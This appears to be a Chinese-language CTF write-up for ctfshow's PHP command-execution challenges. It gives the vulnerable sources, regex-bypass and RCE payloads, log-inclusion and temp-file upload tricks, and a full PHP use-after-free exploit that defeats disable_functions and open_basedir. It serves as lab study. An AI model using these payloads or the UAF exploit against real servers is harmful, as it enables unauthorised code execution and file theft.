---
id: ctfshow-重温命令执行
title: ctfshow-重温命令执行
---


<!-- more -->

## 29-正则绕过

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:26:48
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

正则匹配flag，基于linux中的单引号、双引号和反引号的特性，可以用引号绕过~

> 单引号：会将其中内容都当做字符串，忽略所有命令和特殊字符
>
> 双引号：会解析其中的特殊字符和变量，如果要原样输出特殊字符需要用`\`转义
>
> 反引号：会将反引号中的字符串当作命令执行，反引号类似`$(command)`
>
> ![](https://i.loli.net/2021/11/01/S2nwGrNPY5JbOlB.png)

```
?c=system("tac fl''ag.php");
```



## 30-正则绕过

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:42:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

在29基础上过滤了system和php

```
?c=echo `tac fl''ag.p''hp`;
```



## 31-正则绕过

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:10
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

%09绕过空格，过滤了`.`和一些关键字，通配符*绕

```
?c=echo%09`tac%09fl*`;
```

## 32-36 文件包含+伪协议

32

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:56:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

文件包含(include/require)+伪协议读文件：
因为分号被过滤了，这里改用?>闭合

```
?c=include%0a$_GET[1]?>
&1=php://filter/read=convert.base64-encode/resource=flag.php
```

> 丢一下以前做的笔记
>
> 33：
>
> ```
> ?c=require%0a$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
> ```
>
> 34、35：
> 过滤了:、(
> 只能使用`语言结构`(无需括号)如：echo、print、isset、unset、include、require
> 1、
>
> ```
> ?c=print%0a$_GET[1]?>&1=phpinfo();
> ```
>
> 传入eval($c) --》无法执行
> 原因是此处phpinfo();作为字符段，而不是代码段
> 2、
>
> ```
> ?c=include%0a$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
> ```
>
> 实际是读取文件，而不是代码执行--，eval的作用是拼接括号内语句到php文件中
>
> 36：禁用数字，更改参数即可，这里的a可以不加引号，因为php版本要向下兼容，为了可能更改
>
> ```
> ?c=include%0a$_GET[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
> ```
>
> 

## 37、38-伪协议|日志文件getshell

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:18:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

eval改为include

但是正则过滤了关键词flag，可以用data://伪协议的base64过滤器来绕过~

```
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==
```

或者日志文件包含getshell都行~，可以看到用的是nginx，

包含nginx日志文件：/var/log/nginx/access.log，然后在ua头写一句话就行

## 39

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:13:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
}
```

可以用`?>`来闭合php代码，使得其后的`.php`会被当中普通的html字符直接显示在页面上
记得引号绕过正则过滤

```
?c=data://text/plain,<?= system("tac fla''g.php");?>
```

## 40-无参数命令执行

**GXYCTF的禁止套娃**

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

> 看下hint中的做法：
>
> ```
> ?c=session_start();system(session_id());
> passid=ls
> ```
>
> 还有俺以前记的笔记，
> 详情看yu师傅的博客：[ctfshow web入门 命令执行部分 （37-40）_羽的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/108415301)
>
> ```
> 无参数命令执行：
> 方法1、下述思路就是先利用变量获取flag.php，再将其显示出来
> scandir(目录,[0|1:升|降序],[context])——列出指定路径中的文件和目录localeconv()——返回一包含本地数字及货币格式信息的数组,数组第一项是.
> current()——返回数组中的当前元素值, 默认取第一个值，别名为pos()
> array_reverse()——逆向输出数组
> array_flip()交换数组的键和值
> array_rand()从数组随机一个或多个单元，不断刷新访问就会不断随机返回
> 
> payload:
> show_source(next(array_reverse(scandir(pos(localeconv())))));
> highlight_file(next(array_reverse(scandir(current(localeconv())))));
> highlight_file(array_rand(array_flip(scandir(current(localeconv())))));
> highlight_file(next(array_reverse(scandir(current(localeconv())))));
> 
> 方法2、eval(arrar_pop(next(get_defined_vars())));  +post传参 
> ```
>
> 

## 41-无字母数字rce

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 羽
# @Date:   2020-09-05 20:31:22
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:40:07
# @email: 1341963450@qq.com
# @link: https://ctf.show

*/

if(isset($_POST['c'])){
    $c = $_POST['c'];
if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
        eval("echo($c);");
    }
}else{
    highlight_file(__FILE__);
}
?>
```

过滤了字母数字、还有 `异或^`、`取反~`、`+`、`-`，还有`[`、`]`、`$`

但还有`或|`可用，用或运算来构造命令即可

可参考p神的这两篇：

1. [一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)
2. [无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

当然还有yu师傅写好的脚本：[无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）_羽的博客-CSDN博客](https://blog.csdn.net/miuzzx/article/details/109143413)

## 42-/dev/null和文件描述符

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 20:51:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

关键在`system($c." >/dev/null 2>&1");`，大致意思就是会将咱们传入的命令的执行/报错结果会被重定向到`/dev/null`

- `/dev/null`（或称空设备）在类Unix系统中*是*一个特殊的设备文件，它丢弃一切写入其中的数据（但报告写入操作成功），读取它则会立即得到一个EOF
  这里`>/dev/null`大概意思就是咱们执行的命令不会有任何回显

- ` 2>&1`，表示将标准错误输出重定向等同于标准输出，而因为之前标准输入已经被重定向到`/dev/null`
  所以标准错误输出也被重定向到空设备

  | 文件描述符 | 文件名 | 类型             | 硬件   |
  | ---------- | ------ | ---------------- | ------ |
  | 0          | stdin  | 标准输入文件     | 键盘   |
  | 1          | stdout | 标准输出文件     | 显示器 |
  | 2          | stderr | 标准错误输出文件 | 显示器 |

这里可以用分号`;`或者urlencode后的换行符`%0a`来截断，试了一下发现`||`（上一条执行失败才执行下一条）也行~

```
?c=tac flag.php%0a
?c=tac flag.php;
?c=tac flag.php ||
```

## 43-52-各种绕过

更多glob通配符可以看[glob(7) - Linux manual page (man7.org)](https://man7.org/linux/man-pages/man7/glob.7.html)

43：基于42过滤了`cat`和`分号`，用另外两种

44：基于43过滤了`flag`，用`适配符*`或者`占位符?`：`?c=tac fl*%0a`或者`?c=tac fla?.php%0a`

45：基于44过滤了`空格`；可以用` %09`、`${IFS}`、`<>`这些：`?c=tac%09fl*%0a`或者`?c=tac${IFS}fl*%0a`
ps：<>是输入/输出重定向~

46：过滤了`数字`、`$`、`*`; `占位符?`或者`引号（''、""、``）`或者`转义字符\`绕过正则匹配flag：`?c=tac<>fla''g.php||`

47-49：过滤了一些命令；
记一些常用的获得文件内容的命令：`cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev、vi、vim、awk、strings、od`

50：过滤了`%09`；`?c=tac<fla\g.php%0a`

51：过滤`%`和`tac`，改用`||`和`nl`；`?c=nl<fla\g.php||`

52：过滤了`<>`，但`$`又可用了，用$IFS：`?c=nl${IFS}fla''g.php||`



## 53

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 18:21:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

从这开始使用system()：成功返回输出的最后一行，失败返回false；并且没有/dev/null啦
` ?c=ta''c${IFS}fla?.php`

## 54

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 19:43:42
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

增强了正则过滤，实际是ban了参杂字符绕过关键字过滤，

三个思路

1. mv改名：`?c=mv${IFS}fla?.php${IFS}a.txt`；然后url访问a.txt文件

2. 因为命令都放在`/bin`下，用占位符`?`：`?c=/bin/c??${IFS}????????`(vi也可用)

3. 用grep：`grep${IFS}ctfshow${IFS}f???.???`

   > grep 命令用于查找文件里符合条件的字符串

## 55、56-无字母数字rce

55如下，56多过滤了一些特殊字符，方法不变

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 20:03:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}

```



### 解法1-p神无字母数字rce提高篇

> 以下摘自：[无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
>
> 1. shell下可以利用`.`来执行任意脚本；用`. file`执行文件，是不需要file有x权限的
>
>    而这样的文件很好得到：
>
>    发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。
>    
>
> 2. Linux文件名支持用glob通配符代替，Linux下的glob通配符：
>
>    - `*`可以代替0个及以上任意字符
>    - `?`可以代表1个任意字符
>
>    `/tmp/phpXXXXXX`就可以表示为`/*/?????????`或`/???/?????????`。
>
> 3. ascii码表中大写字母位于`@`与`[`之间，可以利用`[@-[]`来表示大写字母

构造post页面：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://target-url/" method="post" enctype="multipart/form-data">
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>

```

然后抓包改内容就好了，因为原理是执行临时文件里的命令--，所以传啥无所谓

![](https://i.loli.net/2021/11/03/uYmrac5vVPN8WMA.png)

也可以用Y4师傅写的脚本

```php
author:Y4tacker
import requests

while True:
    url = "http://target-url/?c=.+/???/????????[@-[]"
    r = requests.post(url, files={"file": ('1.php', b'cat flag.php')})
    if r.text.find("flag") >0:
        print(r.text)
        break

```

### 其他解法：/bin和/usr/bin

学习了这位师傅的做法[ctfshow-命令执行_Ly's的博客-CSDN博客_](https://blog.csdn.net/weixin_45794666/article/details/111403030)

> 1、/bin
> 因为没有禁用数字，这里我们可以利用 /bin下的base64 中的64 进行通配符匹配 即 `/bin/base64 flag.php`
>
> ```
> ?c=/???/????64%20????.??? 即 /bin/base64 flag.php
> ```
>
> 
> 2、/usr/bin
>
> 还可以利用/usr/bin下的bzip2 先将flag.php文件进行压缩，然后再url访问下载
>
> ```
> 先?c=/???/???/????2 ????.??? 然后在url + /flag.php.bz2 下载文件
> ```

> 1. /bin：是系统的一些指令。bin为binary的简写主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。
> 2. /sbin：一般是指超级用户指令**。**主要放置一些系统管理的必备程式例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。
> 3. /usr/bin：是你在后期安装的一些软件的运行脚本。主要放置一些应用软体工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome*、 gzip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb*、wget等。
> 4. /usr/sbin：放置一些用户安装的系统管理的必备程式例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等。

## 57-$(())+~数字构造

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-08 01:02:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

利用`$(())`和`~`来构造出数字36

```sh
echo ${_} #返回上一次的执行结果
echo $(()) #0
echo ~$(()) #~0
echo $((~$(()))) #~0是-1
echo $(($((~$(())))$((~$(()))))) #$((-1-1))即$$((-2))是-2
echo $((~-37)) #~-37是36
~$(())=-0；$((~$(())))=-1；#那么36个$((~$(())))相加再取反即得36
```

最终payload：

```sh
$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))
```

## 58-65-disable_functions

disable_functions禁用了很多函数，方法很多

> 目录遍历：
>
> ```
> scandir()、dirname():
> var_dump(scandir("./"));
> var_dump(scandir(dirname('__FILE__')));
> var_dump(scandir("glob://./*"));
> ```
>
> 读文件：
>
> ```
> file_get_content()：echo file_get_content('flag.php');
> show_source()
> include()
> highlight_file()
> readfile()
> var_dump() / print_r() +file()：var_dump(file('flag.php'));
> ```
>
> 

看了y4师傅博客学了一些新的操作：

下面引用内容摘自：[[CTFSHOW\]命令执行 Y4tacker的博客-CSDN博客](https://blog.csdn.net/solitudi/article/details/109837640)

> 首先要获取文件路径，在这里我们可以用两种方式，我暂时想到这两种
>
> ```
> c=print_r(scandir(dirname('__FILE__')));
> c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
> ```
>
> 因为没有任何过滤我们便可以读取任意的文件
>
> ```
> c=$a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "<br>"; };
> ```
>
> 

> ```
> 通过fopen去读取文件内容，这里介绍下函数
> fread()
> fgets()
> fgetc()
> fgetss()
> fgetcsv()
> gpassthru()
> payload:
> c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}//一行一行读取
> c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}//一个一个字符读取
> c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}
> ```
>
> ```
> $a=fopen("flag.php","r");while (!feof($a)) {$line = fgetss($a);echo $line;} //php7.3版本后 该函数已不再被使用
> 还有新姿势
> 
> //通过复制，重命名读取php文件内容（函数执行后，访问url/flag.txt）
> copy()
> rename()
> //用法：
> copy("flag.php","flag.txt");             //过60
> rename("flag.php","flag.txt");           //过60
> ```
>
> 

## 66、67-目录遍历

flag不存于flag.php，扫描一下目录

```
 c=var_dump(scandir('/'));    #/flag.txt
 c=highlight_file('/flag.txt');
```



## 68-70-文件包含函数

highlight_file被ban：

```
c=include(’/flag.txt’);
c=require(’/flag.txt’);
c=require_once(’/flag.txt’);
```



## 71-exit()

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
```

大致意思是：
`$s = ob_get_contents();`：命令执行完毕后获取缓冲区内容赋给$s
`ob_end_clean();`：然后清空缓冲区
`preg_replace("/[0-9]|[a-z]/i","?",$s);`：再把所有输出的字符替换为?

可以执行exit();让后面的代码不执行直接退出：

```
c=include('/flag.txt');exit(0);
```

## 72-绕过open_basedir

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>
```

发现ini_set被ban了，这里利用glob伪协议绕过查看目录

```
c=?><?php $a=new directoryiterator("glob:///*"); foreach($a as $f) {echo($f->__tostring().' '); } exit(0); ?>
```

这个：[exploits/exploit.php at master · mm0r1/exploits (github.com)](https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php)

还有群主给的uaf：

```php
c=function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
#需要通过url编码哦

```



## 73、74-DirectoryIterator类

1. 使用72的poc，但是strlen()被禁用了，可以重写strlen，再利用uaf

2. scandir被禁用,使用DirectoryIterator类（无open_basedir）

   ```
   c=?><?php $a=new directoryiterator("glob:///*"); foreach($a as $f) {echo($f->__tostring().' '); } exit(0); ?>
   ```

    得到/flagc.txt，访问之：

   ```
   c=require('/flagc.txt');exit();
   ```



## 75、76-pdo-load_file

依然是扫描，得到flag36.txt

```
c=?><?php $a=new directoryiterator("glob:///*"); foreach($a as $f) {echo($f->__tostring().' '); } exit(0); ?>
```

存在open_basedir
于是利用mysql的pdo连接 load_file 访问该文件：（这里的数据库名）(76为flag36d.txt)

```
c=try {$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root',
'root');foreach($dbh->query('select load_file("/flag36.txt")') as $row)
{echo($row[0])."|"; }$dbh = null;}catch (PDOException $e) {echo $e->getMessage();exit(0);}exit(0);
```



## 77-FFI

用FFI ，需要php>=7.4：[PHP: FFI::cdef - Manual](https://www.php.net/manual/zh/ffi.cdef.php)

1. 蚁剑disable_function插件ffi.php7.4绕过

2. payload: 执行后访问1.txt

   ```
   c=?><?php $ffi = FFI::cdef("int system(const char *command);");
   $ffi->system("/readflag > 1.txt");
   exit();
   ```

   其中：
   
   ```
   $ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
   $a='/readflag > 1.txt';//没有回显的
   $ffi->system($a);//通过$ffi去调用system函数
   ```
   
   



## 118-剪裁内置变量构造命令

F12看源码：`system($code)`

fuzz发现ban了很多东西，只能使用大写字母和一些符号

可以剪裁(切片)内置变量如：$PATH、$IFS等等来构造指令输出flag
关于内置变量可以看：[常见 Bash 内置变量介绍 - sparkdev - 博客园](https://www.cnblogs.com/sparkdev/p/9934595.html)

利用`${PATH}中bin的n`和`${PWD}html的l`构造nl：`${PATH:~A}${PWD:~A}` (~取反表示从最后面开始数，a相当于0)

```
${PATH:~A}${PWD:~A}$IFS????.???
```



## 119

> 过滤了`$PATH`

1. 构造tac flag.php：

   > PHP_CTLAGS=-fstack-protectxxxxxx
   > PHP_VERSION=7.3.22
   > SHLVL=2（深度，默认为1）
   >
   > 那么取PHP_CFLAGS的第三位起的三位字母即可得到命令tac
   > 构造：
   >
   > ```
   > 3=${PHP_VERSION:${PHP_VERSION:~A}:~${SHLVL}}
   > tac=${PHP_CFLAGS:${PHP_VERSION:${PHP_VERSION:~A}:~${SHLVL}}:${PHP_VERSION:${PHP_VERSION:~A}:~${SHLVL}}}
   > ```
   >
   > payload：
   >
   > ```
   > ${PHP_CFLAGS:${PHP_VERSION:${PHP_VERSION:~A}:~${SHLVL}}:${PHP_VERSION:${PHP_VERSION:~A}:~${SHLVL}}} ????.???
   > ```

2. 构造`/bin/cat flag.php`，就是hint给出的：

   ```
   ${HOME:${#HOSTNAME}:${#SHLVL}}     ====>   $HOME的第$HOSTNAME个后取$SHLVL个为t
   ```

3. 参考ly's师傅的：[ctfshow-命令执行Ly's的博客-CSDN博客](https://blog.csdn.net/weixin_45794666/article/details/111403030)

   > 构造 `/bin/base64 flag.php`，因为`?`和`空格`没被过滤,所以只需要用内部函数构造/和4就行
   >
   > ```
   > /???/???4 ???.???
   > ```
   >
   > 
   >
   > 用到的内置变量：
   >
   > 1. $RANDOM 产生随机整数 范围在0 - 32767之间
   > 在linux中可以用 `${#变量}`显示变量的长度
   > 那么`${#RANDOM}`就有概率得到4了，多请求几次即可
   >
   > 2. $PWD为/var/www/html,这里也没有过滤,变量前一位为::1
   > 但是1也是被过滤的,所以还需要构造1
   >
   > 3. SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器
   >
   > 默认开始是1，那么就利用他来构造1
   >
   > ```
